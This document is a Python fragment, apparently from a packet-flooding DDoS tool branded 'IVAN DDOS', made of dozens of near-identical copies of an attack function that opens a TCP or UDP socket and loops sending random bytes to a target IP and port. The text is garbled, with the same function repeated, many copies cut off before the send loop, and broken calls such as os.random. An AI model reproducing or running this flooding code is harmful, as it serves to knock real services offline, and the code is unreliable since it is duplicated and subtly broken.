    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

